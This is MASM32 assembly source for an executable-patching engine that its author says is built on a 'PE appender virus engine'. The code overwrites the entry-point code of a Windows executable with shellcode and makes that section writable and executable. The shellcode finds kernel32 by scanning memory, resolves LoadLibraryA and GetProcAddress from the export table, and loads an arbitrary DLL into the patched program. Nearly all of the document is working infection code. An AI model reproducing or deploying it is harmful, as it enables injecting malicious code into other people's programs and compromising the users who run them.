;Things To Be kept in mind:
;Fakedminded dll companion Patch in Engine v1.0 beta (FDCPIE)
;This Engine provided as it is to help coders to in(j/f)ect their dll functions(written)
;to the exectuable file, The Engine didnt get thru alot of testing so its version's name imply "beta"
;This code is based on the skeleton of my PE appender virus engine,thats why alarm maybe triggered
;by some avers.
;You can still be able to modify/Use/etc under one condition of that you mention the author of this Engine.
;contact me thru :ass-koder.de.vu [my site]-- eof-project.net [EOF-project's site]
;

.386 
.model flat,stdcall 
option casemap:none 

include \masm32\include\windows.inc 
include \masm32\include\kernel32.inc 
include \masm32\include\user32.inc 

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib 


.data?
buffer db 256 dup(?)
.data
hexA db "%xh ",0
func_1 dd 0
func_2 dd 0

.code


;///////////////////getting kernel base/////////////
get_kernel:
mov eax,00

call @f
Q1:
mov eax,-1
or eax,eax
inc eax
ret
sissy equ $ - offset Q1

@@:
mov edx,[esp]
add esp,4
sub edx,@b
mov ebp,edx
add ebp,sissy
jmp $+3
ret
mov [ebp+ep_],eax

call @f
call find_main_api
ret
@@:
jmp this_code

kernel_base dd 0
ep_ dd 0
this_code:

mov ecx,[esp+4]

loop_find_kernel:

xor edx,edx
dec ecx
mov dx,[ecx+3ch]
test dx,0f800h
jnz loop_find_kernel

cmp ecx,[ecx+edx+34h]
jnz loop_find_kernel

cmp word ptr [ecx],"ZM"

jne loop_find_kernel

mov [ebp+offset kernel_base],ecx
lrrt:
ret
;/////////////////end getting kernel base///////////////

find_main_api:

jmp finder_data
PE_offset dd 0
Export_address dd 0
Export_size dd 0
Current_kern dd 0
function_no dd 0
function_addr dd 0
function_ord dd 0
function_name dd 0
base_ord dd 0
GetProcAddressF db "GetProcAddress",0
LoadLibraryF db "LoadLibraryA",0
dll_name db "test.dll",0
func_name db "init_",0

AGetProcAddressF dd 0

finder_data:
mov edi,[ebp+offset kernel_base]
add edi,[edi+3ch]      ;just checking
cmp word ptr [edi],"EP"
jne exit

mov dword ptr [ebp+offset PE_offset],edi
mov eax,[edi+78h]      ;export table rva
push eax
mov eax,[edi+7ch]      ;export table size 
mov [ebp+offset Export_size],eax
pop eax
mov [ebp+offset Export_address],eax
add eax,[ebp+offset kernel_base]
mov edx,[eax+16]               ;  ordinal base
add edx,[ebp+offset kernel_base]  
mov [ebp+offset base_ord],edx
mov edx,[eax+24]               ;no. of exported functions
mov [ebp+offset function_no],edx 
mov edx,[eax+28]              ;rva of exported functions
add edx,[ebp+offset kernel_base]
mov [ebp+offset function_addr],edx 
mov edx,[eax+32]              ; rva of exported function name
add edx,[ebp+offset kernel_base]
mov [ebp+offset function_name],edx
mov edx,[eax+36]  ;rva for name ordinal
add edx,[ebp+offset kernel_base]
mov [ebp+offset function_ord],edx
xor edx,edx 
xor eax,eax
lea edx,[offset GetProcAddressF+ebp]
call find_now
mov [ebp+func_1],eax
lea edx,[offset LoadLibraryF+ebp]
call find_now
mov [ebp+func_2],eax
lea eax,dword ptr [ebp+offset dll_name]

push eax
call dword ptr [ebp+func_2]
lea edx,dword ptr [ebp+offset func_name]

push edx
push eax
call dword ptr [ebp+offset func_1]
push code_size
push [ebp+ep_]
call eax
ret

find_now:
xor ecx,ecx
mov eax,[ebp+offset function_name] ; getting the GetProcAddress api address
mov edi,[eax]
add edi,[ebp+offset kernel_base]

loop_search_1:
mov esi,edx
match_byte:

cmpsb
jne Next_one
cmp byte ptr [edi],0
je Got_it
jmp  match_byte

Next_one:
inc cx
add eax,4
mov edi,[eax]
add edi,[ebp+offset kernel_base]

jmp loop_search_1
jmp exit
Got_it:

mov edi,[eax]
add edi,[ebp+offset kernel_base]
shl ecx,1
mov eax,[ebp+offset function_ord]
add eax,ecx
xor ecx,ecx
mov cx,word ptr [eax]
shl ecx,2
mov eax,[ebp+offset function_addr]
add eax,ecx
mov eax,[eax]
add eax,[ebp+offset kernel_base]
;mov [ebp+offset AGetProcAddressF],eax

ret

exit_finder:
mov eax,0

ret
end__:
code_size = $-get_kernel
inject:
.data?
file_H dd ?

.data
filename1 db "sample.exe",0
.data?
f_mem dd ?
f_size dd ?
file_handle dd ?
prev_entry dd ?
bwr dd ?
.code
patch_it:
invoke CreateFile,offset filename1,40000000h+80000000h,0,0,3,0,0
mov file_handle,eax
cmp eax,INVALID_HANDLE_VALUE
jne @f
ret
@@:
invoke GetFileSize,eax,0
mov f_size,eax
invoke GlobalAlloc,0,eax
mov f_mem,eax
invoke ReadFile,file_handle,f_mem,f_size,offset bwr,0

mov edx, f_mem
cmp word ptr [edx],'ZM'
jne err_sec

add edx,dword ptr [edx+3ch]                ;---->I've got to PE!e
cmp word ptr [edx],'EP'
jne err_sec

mov ebx, dword ptr [edx+52]              
;mov dword ptr [ebp+offset image_base],eax  ;---->Image base save it 
mov eax, dword ptr [edx+40]
mov  prev_entry,eax  ;---->so as the entry point
mov esi,offset get_kernel
push prev_entry
pop [esi+1]
add [esi+1],ebx
xor ecx,ecx
mov cx,word ptr [edx+6h]
xor eax,eax
mov ax,word ptr [edx+14h]       ;--->getting the optional header size
add ax,24                       ;--->adding 24(offset of optional header from PE) to get into sections' headers 
add edx,eax

call find_1stsec
mov edx,eax
mov dword ptr [edx+36],0c0000040h
mov eax,[edx+0ch]
sub prev_entry,eax


.data?
sect_offset dd ?
sect_size dd ?
sect_mem dd ?
sect_v_size dd ?
.data
output db "code.sss",0 ;full path maybe needed

.code
push dword ptr [edx+08h]
pop sect_v_size

push dword ptr [edx+14h]
pop sect_offset
mov eax,prev_entry
add sect_offset,eax
push dword ptr [edx+0ch]
pop sect_size
invoke GlobalAlloc,0,sect_size
mov sect_mem,eax
mov esi,f_mem
add esi,sect_offset
mov edi,sect_mem
mov ecx,code_size;sect_size

rep movsb
mov esi,offset get_kernel
mov edi,f_mem
add edi,sect_offset

mov ecx,code_size
rep movsb
invoke SetFilePointer,file_handle,0,0,FILE_BEGIN
invoke WriteFile,file_handle,f_mem,f_size,offset bwr,0
invoke CloseHandle,file_handle
invoke CreateFile,offset output,40000000h,0,0,2,0,0
push eax
invoke WriteFile,eax,sect_mem,code_size,offset bwr,0
call CloseHandle


err_sec:
ret

find_1stsec:
push ebx
push edx
mov ebx,prev_entry
@ddd:
xor eax,eax
mov eax,[edx+0ch] ;V.Address compare with the entry point!
cmp eax,ebx
jle @f
add edx,28h
jmp @ddd
@@:
add eax,[edx+10h];size of raw data
cmp eax,ebx
jg found_pointer
add edx,28h

jmp @ddd
found_pointer:
xchg eax,edx
pop edx
pop ebx

findsectL:
ret

start:
call patch_it

exit:
ret


end start         


